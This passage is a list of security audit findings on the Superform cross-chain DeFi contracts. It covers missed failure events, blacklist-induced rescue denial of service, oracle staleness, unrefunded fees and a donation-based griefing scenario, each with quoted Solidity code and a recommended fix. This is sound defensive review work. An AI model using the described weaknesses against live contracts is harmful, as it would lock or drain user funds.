The [\_multiDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L750) function within the `CoreStateRegistry` contract is responsible for orchestrating deposits into multiple vaults. It handles the process by iterating over an array of superForm IDs and attempting to deposit the corresponding amounts.

- The function attempts to deposit into each specified superForm.
- Successful deposits set a `fulfilment` flag, while failed deposits set an `errors` flag.
- On `fulfilment`, the function returns with `_multiReturnData`.
- On `errors`, the function should emit a `FailedXChainDeposits` event for "CORE_STATE_REGISTRY_RESCUER_ROLE" keeper.

- An issue arises when there are both successful and failed deposits within the same transaction. The current implementation returns early when there is atleast one `fulfilment` (true), which can prevent the emission of the `FailedXChainDeposits` event for any simultaneous `errors`. This behavior lead to a scenario where the `"CORE_STATE_REGISTRY_RESCUER_ROLE" `keeper, who operates based on events, does not receive the signal to propose the failed deposit amounts.

```js
// ..prev code ....
    if (fulfilment) {
  >>     return _multiReturnData(
            srcSender_,
            multiVaultData.payloadId,
            TransactionType.DEPOSIT,
            CallbackType.RETURN,
            multiVaultData.superformIds,
            multiVaultData.amounts
        );
    }
    // @audit-issue early return prevents the following event from being emitted even if there are failed deposits
    if (errors) {
        emit FailedXChainDeposits(payloadId_);
    }
```

- The absence of the `FailedXChainDeposits` event due to early return in the case of `fulfilment` hinders the keeper ability to perform updates, assuming the payload was processed without issue Especially that the function [processPayload](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L147) will emit only `PayloadProcessed(payloadId_)` event. leaving the user unable to rescue their funds.

```js
function processPayload(uint256 payloadId_) external payable virtual override {
        // ... prev code ...
 >>    emit PayloadProcessed(payloadId_);
    }
```

- impact :

- keepers won't propose rescue amounts, leading to loss of user funds for failed deposits.

- Recommendation

- The [\_multiDeposit](https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L750) function should be updated to emit `FailedXChainDeposits` event for any errors before handling successful deposits. This ensures all necessary events are emitted for keeper operations.

```js
if (errors) {
    emit FailedXChainDeposits(payloadId_);
}
if (fulfilment) {
    return _multiReturnData(
        // ... parameters ...
    );
}
```



### Failed Deposits might never get rescued

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


- Proof of Concept

Take a look at [CoreStateRegistry.sol#L277-L313](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L277-L313)

```solidity
    function finalizeRescueFailedDeposits(uint256 payloadId_) external override {
        /// @dev validates the payload id
        _validatePayloadId(payloadId_);


        FailedDeposit storage failedDeposits_ = failedDeposits[payloadId_];


        /// @dev the timelock is elapsed
        if (
            failedDeposits_.lastProposedTimestamp == 0
                || block.timestamp < failedDeposits_.lastProposedTimestamp + _getDelay()
        ) {
            revert Error.RESCUE_LOCKED();
        }


        /// @dev set to zero to prevent re-entrancy
        failedDeposits_.lastProposedTimestamp = 0;
        IDstSwapper dstSwapper = IDstSwapper(_getAddress(keccak256("DST_SWAPPER")));


        uint256 len = failedDeposits_.amounts.length;
        for (uint256 i; i < len; ++i) {
            /// @dev refunds the amount to user specified refund address
            if (failedDeposits_.settleFromDstSwapper[i]) {
              //@audit
                dstSwapper.processFailedTx(
                    failedDeposits_.refundAddress, failedDeposits_.settlementToken[i], failedDeposits_.amounts[i]
                );
            } else {
              //@audit
                IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
                    failedDeposits_.refundAddress, failedDeposits_.amounts[i]
                );
            }
        }


        delete failedDeposits[payloadId_];
        emit RescueFinalized(payloadId_);
    }
```

As seen, this function allows anyone to settle refunds for unprocessed/failed deposits past the challenge period, issue with this is that the attempt to rescue(transfer) these failed deposits are not done in a try catch format, i.e if the settlement token is any ERC20 token that implements a blacklisting feature then the attempt would fail if the receiver gets blacklisted, this happens even if the call gets routed via `dstSwapper.processFailedTx()` as it also tries transferring the interim token as seen in this [line](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L259).

Additionally, note that tokens with this functionality are quite popular in the market, with even the leading stablecoins employing this functionality, namely namely `USDC` and `USDT` which have massive adoption of ~ 110 billion US dollars, its got a `notBlacklisted()` modifier that's required for functions such as `transfer()`, `transferFrom()` and `approve()`, which causes this [line](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L259) to revert.

> To find out more about tokens that could blocklist users, check this: https://github.com/d-xo/weird-erc20#tokens-with-blocklists.

- Impact

High cause asides the inability to process failed transactions, that's a complete DOS to an attempt to finalize the refunds for unprocessed deposits attached to a specific `payloadId_`, which would cause **other users** that are not even at fault _(in this case not blacklisted)_ to also not have any access to their funds since it's now stuck.

- Recommended Mitigation Steps

The `finalizeRescueFailedDeposits` should implement a try catch while trying to process the failed txs, if one fails others should receive their funds and then maybe an integration could be made so that the blacklisted user could come and claim their token and specify a different address.




### The issue M-6 from Gpresoon's audit report regarding low level call is still persistent

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


- Proof of Concept

See M-6 from [Gpresoon's audit report](https://github.com/superform-xyz/superform-core/files/13300598/2023-09-superform.pdf), with the implemented fix being this [commit](https://github.com/superform-xyz/superform-core/pull/249/files/37a024a0a6090dcf308c3eebafe118ab16b5985c), as seen by the commit and what's currently in the codebase, the better security that was provided was only the introduction of a `0x0` address check.

Where as the recommendation suggested was to try checking for `0x0` and `EOA` address check, it wouldn't be right to not check for contract existence cases for the bridges which means the CA existence check should be applied.

Now take a look at the implementation of the [`_dispatchTokens`](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L33) function

```solidity

    function _dispatchTokens(
        address bridge_,
        bytes memory txData_,
        address token_,
        uint256 amount_,
        uint256 nativeAmount_
    )
        internal
        virtual
    {
        if (bridge_ == address(0)) {
            revert Error.ZERO_ADDRESS();
        }

        if (token_ != NATIVE) {
            IERC20 token = IERC20(token_);
            token.safeIncreaseAllowance(bridge_, amount_);
        } else {
            if (nativeAmount_ < amount_) revert Error.INSUFFICIENT_NATIVE_AMOUNT();
        }
      //@audit
        (bool success,) = payable(bridge_).call{ value: nativeAmount_ }(txData_);
        if (!success) revert Error.FAILED_TO_EXECUTE_TXDATA(token_);
    }
}
```

As seen, this function is used to send/dispatch tokens via like an exchange or a bridge, the primary issue lies now lies in the fact that if the `bridge` is not a valid contract then the attempt to call this would come out true even if the call fails, cause low level calls in solidity return true even if they fail in as much as the address called is non-existent or an EOA.

- Impact

Imo, unlike the original submission's severity this should be low since this could be somewhat considered admin misconfiguration.

- Recommended Mitigation Steps

Apply the suggested fix of checking if the address that's to be called on exists.




### Protocol aims for fair pricing so as not to over/under charge users but lacks enough checks to ensure this

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


- Proof of Concept

Based on 7.2.9 from the [Hans Audit](https://github.com/superform-xyz/superform-core/files/13300591/Superform_Core_Review_Final_Hans_20230921.pdf) and the resolution that was reached, protocol cares about using real prices in order not to overcharge users, but currently protocol doesn't employ enough checks to ensure that the price being used is always accurate

Take a look at [PaymentHelper.sol#L828-L840](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L828-L840)

```solidity
    /// @dev helps return the current gas price of different networks
    /// @return native token price
    function _getGasPrice(uint64 chainId_) internal view returns (uint256) {
        address oracleAddr = address(gasPriceOracle[chainId_]);
        if (oracleAddr != address(0)) {
            (, int256 value,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();
            if (value <= 0) revert Error.CHAINLINK_MALFUNCTION();
            if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
            return uint256(value);
        }


        return gasPrice[chainId_];
    }
```

Noting from the 7.2.9 of the Hans audit and the resolution that was reached, protocol implemented multiple checks to ensure that "real prices" are used but this checks are not enough cause Chainlink aggregators have a built in circuit breaker if the price of an asset goes outside of a predetermined price band. The result is that if an asset experiences a huge drop in value (e.g LUNA crash) the price of the oracle will continue to return the minPrice instead of the actual price of the asset. This would allow user to continue borrowing with the asset but at the wrong price. This is exactly what happened to [Venus on BSC when LUNA imploded](https://rekt.news/venus-blizz-rekt/).

What the above leads to is a case where for example, `TokenA` has a minPrice of $1. The price of `TokenA` drops to $0.10. The aggregator still returns $1 allowing the protocol to still calculate the fees attached to TokenA as if it's priced as $1 which is 10x it's actual value, leading to overcharging the users.

- Impact

Users could still undercharge/overcharge users since this affects fee calculation of the protocol.


- Recommended Mitigation Steps

Introduce a check for min/max price range and better still have a fallback oracle that provides the price when this occurs.




### Subtle invariant of not having user's attempt to withdraw/deposit fail could be broken

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


- Proof of Concept

Based on protocol's reply to Gpersoon's audit [here](<(https://github.com/superform-xyz/superform-core/files/13300598/2023-09-superform.pdf)>) on oracle prices, quoting them:

> Superform: Since PaymentHelper values are estimates for payments anyway, we'd actually rather have it return a stale number than revert. Some chains where we don't have a price feed will have hardcoded estimates (which could be stale as well, but we'll try and update them via a keeper on intervals).

We can clearly see that the intended design is that querying prices is not a time sensitive situation and they would rather **"use wrong prices"** than have user's execution revert, but based on the current implementation of `_getGasPrice()` the function could still revert and cause a DOS for users cause the attempt of querying chainlink is not done in a try/catch.

Take a look at [PaymentHelper.sol#L828-L840](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L828-L840)

```solidity
    /// @dev helps return the current gas price of different networks
    /// @return native token price
    function _getGasPrice(uint64 chainId_) internal view returns (uint256) {
        address oracleAddr = address(gasPriceOracle[chainId_]);
        if (oracleAddr != address(0)) {
            (, int256 value,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();
            if (value <= 0) revert Error.CHAINLINK_MALFUNCTION();
            if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
            return uint256(value);
        }


        return gasPrice[chainId_];
    }
```

Would be key to note that, asides the fact that Chainlink has a section for feeds that are going to be deprecated as can be seen [here](https://docs.chain.link/data-feeds/price-feeds/addresses?network=ethereum&page=1&categories=deprecating), an attempt to query chainlink could just revert, i.e when the call to the aggregator fails for whatever reason, which would cause the whole idea of not having enough checks seem somewhat worthless and also the fact that user's execution now reverts against protocol's intention.

Since a default price is already present, then either it should be implemented and serve as a fallback price when the query to chainlink reverts or another oracle should be implemented as the fallback oracle.

- Impact

A flaw in intended logic, pricing mechanism might not always be accessible which now breaks protocol's invariant of not wanting the payments estimation to revert since this stops users from depositing or withdrawing to/fro the chain.

- Recommended Mitigation Steps

As hinted in _Proof of Concept_ ... since a default price is already present, then it should be implemented and serve as a fallback price when the query to chainlink reverts or another oracle should be implemented as the fallback oracle.




### Lack of refund mechanism for emergency withdraw

**Severity:** Low risk

**Context:** [ERC4626FormImplementation.sol#L401-L410](superform-core/src/forms/ERC4626FormImplementation.sol#L401-L410)

- Lack of refund mechanism for emergency withdraw

[Emergency Queue](https://docs.superform.xyz/periphery-contracts/emergencyqueue)

When the form is paused,

the transaction payload is queued to emergency queue.

[Line of code](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L85)


Then, the emergency withraw is executed by EmergencyAdmin.

```solidity
function _executeQueuedWithdrawal(uint256 id_) internal {
        QueuedWithdrawal storage data = queuedWithdrawal[id_];
        if (data.superformId == 0) revert Error.EMERGENCY_WITHDRAW_NOT_QUEUED();

        if (data.isProcessed) {
            revert Error.EMERGENCY_WITHDRAW_PROCESSED_ALREADY();
        }

        data.isProcessed = true;

        (address superform,,) = data.superformId.getSuperform();
        IBaseForm(superform).emergencyWithdraw(data.srcSender, data.refundAddress, data.amount);

        emit WithdrawalProcessed(data.refundAddress, id_, data.superformId, data.amount);
    }
 ```
 
 This calls the function below in the form contract.
 
 [Line of code](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/EmergencyQueue.sol#L118)
 
 ```solidity
 function _processEmergencyWithdraw(address refundAddress_, uint256 amount_) internal {
        IERC4626 vaultContract = IERC4626(vault);

        if (vaultContract.balanceOf(address(this)) < amount_) {
            revert Error.INSUFFICIENT_BALANCE();
        }

        vaultContract.safeTransfer(refundAddress_, amount_);
        emit EmergencyWithdrawalProcessed(refundAddress_, amount_);
    }
 ```
 
However, in the case when the form contract does not hold enough vault token, 

transaction will revert in
```solidity
if (vaultContract.balanceOf(address(this)) < amount_) {
            revert Error.INSUFFICIENT_BALANCE();
        }
```

the external call.

```solidity
 vaultContract.safeTransfer(refundAddress_, amount_);
```

It also can revert for unknown reason

but because there is lack of refund mechanism unlike failed cross chain deposit / withdraw when the form is unpaused

the fund is going to lost if emergency withraw cannot be executed.



### M-Malicious-vault-can-steal-user-money

**Severity:** Low risk

**Context:** [ERC4626FormImplementation.sol#L238-L245](superform-core/src/forms/ERC4626FormImplementation.sol#L238-L245)

- M-Malicious-vault-can-steal-user-money

Anyone has the capability to create a vault. Users have the flexibility to deposit directly 
into this vault on the same chain. 

Or, they also have the option to execute a cross-chain deposit.

When a deposit is made, the user's funds are first transferred to a router. 
Then, the router proceeds to transfer the funds to a form. 

After receiving the funds, the form call ``v.deposit`` function.

[Line of code](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L240)

The code operates under the assumption that the vault's underlying implementation reliably processes user deposits and appropriately mints shares for the user. 

However, there is a risk if the vault implementation is malicious. 

In such cases, the vault owner might withdraw these user's funds and abscond without minting the user's shares

or the vault can intentionally revert when user tries to withdraw from the vault (redeem the share).

We can keep the severity as medium because it replies on user to interact with a malicious vault.

However, considering that the underlying vault implementation can be upgraded and that anyone has the capability to create a form contract to take deposits.

This is a fair risk for protocol and user.

- Recommendation 
Whitelist the vault address and vault implementation so that it does not let anyone create vault with any implementation.



### Malicious / compromised address with processor or updater role can intentionally skip user transaction

**Severity:** Low risk

**Context:** [CoreStateRegistry.sol#L147-L147](superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol#L147-L147)

- malicious-address-with-CORE_STATE_REGISTRY_PROCESSOR_ROLE or CORE_STATE_REGISTRY_UPDATER_ROLE or address with EmergencyAdmin access can intentionally skip user transaction

If user invoke transaction xchain deposit or xchain withdraw

such request will be relayed by wormhol / layerzero / hyperlane,

then once the payload is received on dest chain(destination chain),

the payload is stored in a map.

[Line of code](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/BaseStateRegistry.sol#L111)

```solidity
function receivePayload(uint64 srcChainId_, bytes memory message_) external override onlyValidAmbImplementation {
        AMBMessage memory data = abi.decode(message_, (AMBMessage));

        /// @dev proofHash will always be 32 bytes length due to keccak256
        if (data.params.length == 32) {
            bytes32 proofHash = abi.decode(data.params, (bytes32));
            ++messageQuorum[proofHash];

            emit ProofReceived(data.params);
        } else {
            /// @dev if message, store header and body of it
            ++payloadsCount;

            payloadHeader[payloadsCount] = data.txInfo;
            (msgAMBs[payloadsCount], payloadBody[payloadsCount]) = abi.decode(data.params, (uint8[], bytes));

            emit PayloadReceived(srcChainId_, CHAIN_ID, payloadsCount);
        }
    }
```

Then, in CoreStateRegistry.sol,

An address with ```CORE_STATE_REGISTRY_UPDATER_ROLE``` has to update transaction.

An address with ```CORE_STATE_REGISTRY_PROCESSOR_ROLE``` has to process transaction.

However, in instances where address possesses these roles can intentionally skip the payload. 

Even the users locking funds in source chain deposit or burn superposition on the source chain for withdrawal, the corresponding payload request is never delivered on dest chain.

- Recommendation 
Allows user to process the payload in ```CORE_STATE_REGISTRY_PROCESSOR_ROLE``` after a timelock window even the admin failed to process the payload.

**Same issue with emergency withdraw flow**,

once a message is queued on emergency queue,

if the msg.sender address with EmergencyAdmin role never executes emergency withdraw request,

user never get his fund back in dest chain



### `SuperPositions._broadcast` function doesn't refund excess fees to the caller

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- In `SuperPositions` contract: the `_broadcast` function is invoked to broadcast state changes to all remote chains, and to execute this broadcast: a fee must be paid for the bridge.

- The `totalFees` is extracted from the `paymenthelper` where it represents the `totalTransmuterFees` that is required for the bridge to execute the operation (broadcasting); then this value is checked against `msg.value`; where the function will revert if the sent `msg.value` is less than the `totalFees`:

  ```solidity
          if (msg.value < totalFees) {
              revert Error.INVALID_BROADCAST_FEE();
          }
  ```

- But if the caller sends a value > `totalFees`; the extra amount will not be refunded to the caller; which will result in fund loss for the caller.

- Lines of Code

[SuperPositions.\_broadcast function](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperPositions.sol#L371C1-L386C6)

```solidity
    function _broadcast(bytes memory message_) internal {
        (uint256 totalFees, bytes memory extraData) =
            IPaymentHelper(superRegistry.getAddress(keccak256("PAYMENT_HELPER"))).getRegisterTransmuterAMBData();

        (uint8 ambId, bytes memory broadcastParams) = abi.decode(extraData, (uint8, bytes));

        if (msg.value < totalFees) {
            revert Error.INVALID_BROADCAST_FEE();
        }

        /// @dev ambIds are validated inside the broadcast state registry
        /// @dev broadcastParams if wrong will revert in the amb implementation
        IBroadcastRegistry(superRegistry.getAddress(keccak256("BROADCAST_REGISTRY"))).broadcastPayload{
            value: msg.value
        }(msg.sender, ambId, message_, broadcastParams);
    }
```

- Recommendation

Revert the broadcast if the `msg.value != totalFees` :

```diff
    function _broadcast(bytes memory message_) internal {
        (uint256 totalFees, bytes memory extraData) =
            IPaymentHelper(superRegistry.getAddress(keccak256("PAYMENT_HELPER"))).getRegisterTransmuterAMBData();

        (uint8 ambId, bytes memory broadcastParams) = abi.decode(extraData, (uint8, bytes));

-       if (msg.value < totalFees) {
+       if (msg.value != totalFees) {
            revert Error.INVALID_BROADCAST_FEE();
        }

        /// @dev ambIds are validated inside the broadcast state registry
        /// @dev broadcastParams if wrong will revert in the amb implementation
        IBroadcastRegistry(superRegistry.getAddress(keccak256("BROADCAST_REGISTRY"))).broadcastPayload{
            value: msg.value
        }(msg.sender, ambId, message_, broadcastParams);
    }
```



### `PaymentHelper` contract: no checks if arbitrum sequencer is down

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- In `PaymentHelper` contract: prices of native tokens and gas prices can be either hardcoded by the protocol admin or can be extracted by chainlink oracles.

- Since the protocol is intended to be deployed on multiple L1 & L2 chains (Arbitrum is one of them); using Chainlink oracles in L2 chains requires to check if the sequencer is down to prevent using stale prices (that looks like it's fresh while it's stale).

- This can be exploited by malicious users to make crosschain operations (deposits/withdrawals) with stale/invalid prices.

- Lines of Code

[PaymentHelper.\_getGasPrice function](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L830C1-L840C6)

```solidity
    function _getGasPrice(uint64 chainId_) internal view returns (uint256) {
        address oracleAddr = address(gasPriceOracle[chainId_]);
        if (oracleAddr != address(0)) {
            (, int256 value,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();
            if (value <= 0) revert Error.CHAINLINK_MALFUNCTION();
            if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
            return uint256(value);
        }

        return gasPrice[chainId_];
    }
```

[PaymentHelper.\_getNativeTokenPrice function](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L844C1-L854C6)

```solidity
    function _getNativeTokenPrice(uint64 chainId_) internal view returns (uint256) {
        address oracleAddr = address(nativeFeedOracle[chainId_]);
        if (oracleAddr != address(0)) {
            (, int256 dstTokenPrice,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();
            if (dstTokenPrice <= 0) revert Error.CHAINLINK_MALFUNCTION();
            if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
            return uint256(dstTokenPrice);
        }

        return nativePrice[chainId_];
    }
```

- Recommendation

Check that the sequencer is not down when extracting gas and native tokens prices ([check chainlink documentation here regarding this check](https://docs.chain.link/data-feeds/l2-sequencer-feeds#arbitrum)).



### CoreStateRegistry::updateTxData A malicious user can undefinetely grief withdrawal

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
Some checks are made when updating txData during withdrawal. If a user specifies a strict slippage rule, an attacker can grief the operator trying to update withdrawal tx data, and make the transaction fail undefinetely by donating a small amount to the underlying erc4626 vault.


- Vulnerability Detail

- Scenario

Alice asks for a multi withdrawal of amount X from a USDC vault and amount Y from a WBTC vault.
She specifies a slippage parameter of 0.01% for the USDC vault.

Bob sees the operator sending a transaction to update tx data for Alice's withdrawal and front-runs it by donating a small amount directly to the erc4626 vault (of 0.01% of total vault assets). This donation inflates the price of Alices shares, and the check here reverts:
`CoreStateRegistry::_updateTxData`:

```solidity
if (
    !PayloadUpdaterLib.validateSlippage(
        bridgeValidator.decodeAmountIn(txData_[i], false),
        IBaseForm(superform).previewRedeemFrom(multiVaultData_.amounts[i]),
        multiVaultData_.maxSlippages[i]
    )
) {
    revert Error.SLIPPAGE_OUT_OF_BOUNDS();
}
```

- Impact
A withdrawal is delayed undefinetely because the transaction of the operator reverts due to slippage parameters 

Note that since this occurs during a multi withdrawal, the amount impacted may be much larger than what the attacker needs to commit to, to delay withdrawal.

- Code Snippet

- Tool used

Manual Review

- Recommendation
Maybe compute the amount of the update as a formula of the result of `previewRedeemFrom`



### Centralization Risk for trusted owners

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.

*Instances (5)*:

```solidity
File: superform-core/src/settings/SuperRBAC.sol

4: import { AccessControlEnumerable } from "openzeppelin-contracts/contracts/access/extensions/AccessControlEnumerable.sol";

14: contract SuperRBAC is ISuperRBAC, AccessControlEnumerable {

144:     function setSuperRegistry(address superRegistry_) external override onlyRole(PROTOCOL_ADMIN_ROLE) {

153:     function setRoleAdmin(bytes32 role_, bytes32 adminRole_) external override onlyRole(PROTOCOL_ADMIN_ROLE) {

166:         onlyRole(PROTOCOL_ADMIN_ROLE)

```

[4](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L4), [14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L14), [144](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L144), [153](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L153), [166](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L166)



### zero-value ERC20 token transfers can revert for   certain tokens

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Some ERC20 tokens revert for zero-value transfers (e.g. `LEND`). If used as a `order.baseAsset` and a small strike price, the fee token transfer will revert. Hence, assets and the strike can not be withdrawn and remain locked in the contract.
See [Weird ERC20 Tokens - Revert on Zero Value Transfers](https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers)

*Instances (5)*:

```solidity
File: superform-core/src/BaseRouterImplementation.sol

941:                 v.token.safeTransferFrom(srcSender_, address(this), v.approvalAmount);

1039:                 v.token.safeTransferFrom(srcSender_, address(this), v.totalAmount);

```

[941](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L941), [1039](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L1039)

```solidity
File: superform-core/src/crosschain-data/extensions/CoreStateRegistry.sol

305:                 IERC20(failedDeposits_.settlementToken[i]).safeTransfer(
306:                         failedDeposits_.refundAddress, failedDeposits_.amounts[i]
307:                     );

```

[305-307](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L305-L307)



### Chainlink’s `latestRoundData` might return stale or incorrect results

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

According to the Chainlink documentation: [link1](https://docs.chain.link/docs/historical-price-data/#historical-rounds),[link2](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round) This could lead to stale prices.
Consider adding missing checks for stale data.

```solidity

    (uint80 baseRoundID, int256 basePrice, , uint256 baseTimestamp, uint80 baseAnsweredInRound) = baseAggregator.latestRoundData();
    require(baseAnsweredInRound >= baseRoundID, "Stale price");
    require(baseTimestamp != 0, "Round not complete");
    require(basePrice > 0, "Chainlink answer reporting 0");


```

both instances did not check the below condition
```solidity
 require(baseAnsweredInRound >= baseRoundID, "Stale price");
```

*Instances (2)*:

```solidity
File: superform-core/src/payments/PaymentHelper.sol

833:             (, int256 value,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();

847:             (, int256 dstTokenPrice,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData();

```

[833](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L833), [847](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L847)




### Insufficient oracle validation that doesn't check if price is stale

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- [MEDIUM] Insufficient oracle validation
- Number of instances found
 2 

- Resolution
 The contract currently lacks a mechanism to ensure that prices fetched from the Chainlink oracle are up-to-date. In scenarios where the Off-Chain Reporting (OCR) protocol fails to update prices in a timely manner, stale price data could be used inadvertently. This could potentially lead to incorrect contract operations, including mispriced transactions. To mitigate this, consider incorporating a staleness threshold (defined in seconds) into the contract configuration. This would enforce that any price data used is within this specified freshness timeframe, thereby ensuring the contract only operates with relevant and recent price information. 

- Findings
 Findings are labeled with ' <= FOUND' 


<details><summary>Click to show findings</summary>


[PaymentHelper.sol: 831-834](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L830)
```solidity
831: 
832:         address oracleAddr = address(gasPriceOracle[chainId_]);
833:         if (oracleAddr != address(0)) {
834:             (, int256 value,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData(); // <= FOUND
835:             if (value <= 0) revert Error.CHAINLINK_MALFUNCTION();
836:             if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
837:             return uint256(value);
838:         }
839: 
840:         return gasPrice[chainId_];
841:     

```

[PaymentHelper.sol: 844-844](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L844)
```solidity
845: 
846:         address oracleAddr = address(nativeFeedOracle[chainId_]);
847:         if (oracleAddr != address(0)) {
848:             (, int256 dstTokenPrice,, uint256 updatedAt,) = AggregatorV3Interface(oracleAddr).latestRoundData(); // <= FOUND
849:             if (dstTokenPrice <= 0) revert Error.CHAINLINK_MALFUNCTION();
850:             if (updatedAt == 0) revert Error.CHAINLINK_INCOMPLETE_ROUND();
851:             return uint256(dstTokenPrice);
852:         }
853: 
854:         return nativePrice[chainId_];
855:     

```


</details>



### test_check_test

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

test



###  Loss of precision due to large division

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- [LOW] Loss of precision
- Number of instances found
 1 

- Resolution
 Dividing by large integers in Solidity may cause a loss of precision due to the inherent limitations of fixed-point arithmetic in the Ethereum Virtual Machine (EVM). Solidity, like most programming languages, uses integer division, which truncates any decimal portion of the result. When dividing by large integers, the quotient can have a significant decimal component, but this is discarded, leading to an imprecise outcome. This loss of precision can have unintended consequences in smart contracts, especially in financial applications where accurate calculations are crucial. To mitigate this issue, developers should use appropriate scaling factors or specialized libraries that provide safe and precise arithmetic operations. 

- Findings
 Findings are labeled with ' <= FOUND' 


<details><summary>Click to show findings</summary>

[
PaymentHelper.sol: 818-818](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/payments/PaymentHelper.sol#L818)
```javascript
798:     function _convertToNativeFee(uint64 dstChainId_, uint256 dstGas_) internal view returns (uint256 nativeFee) {
799:         
800:         
801:         
802:         uint256 dstNativeFee = dstGas_ * _getGasPrice(dstChainId_);
803: 
804:         if (dstNativeFee == 0) {
805:             return 0;
806:         }
807: 
808:         
809:         
810:         uint256 dstUsdValue = dstNativeFee * _getNativeTokenPrice(dstChainId_); 
811: 
812:         if (dstUsdValue == 0) {
813:             return 0;
814:         }
815: 
816:         
817:         
818:         nativeFee = (dstUsdValue) / _getNativeTokenPrice(CHAIN_ID); // <= FOUND
819:     }

```


</details>



### Remaining eth may not be refunded to users upon external call

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- [LOW] Remaining eth may not be refunded to users
- Number of instances found
 1 

- Resolution
